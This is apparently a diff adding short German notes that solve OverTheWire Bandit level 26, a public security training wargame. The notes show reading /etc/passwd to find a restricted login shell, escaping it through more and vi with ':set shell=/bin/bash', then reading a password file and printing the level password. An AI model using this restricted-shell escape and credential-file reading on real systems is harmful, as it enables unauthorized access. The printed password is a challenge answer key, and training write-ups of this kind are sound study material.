@@ -1,0 +1,30 @@
+ls zeigt einen private_key (level26)
+
+ssh bandit.labs.overthewire.org -p 2220 -l bandit26 -i bandit/level26.key schmeißt einen direkt raus
+
+cat /etc/passwd | grep bandit26 zeigt die login shell
+
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+cat /usr/bin/showtext
+
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+
+
+fenster ganz klein machen triggert more
+
+mit v kann man vi öffnen
+
+:shell öffnet eigentlich eine shell, das nimmt hier aber das command eins weiter oben, also das Bild
+
+mit :set shell=/bin/bash kann man das zurücksetzen
+
+dann :shell
+
+cat /etc/bandit_pass/bandit26
+c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
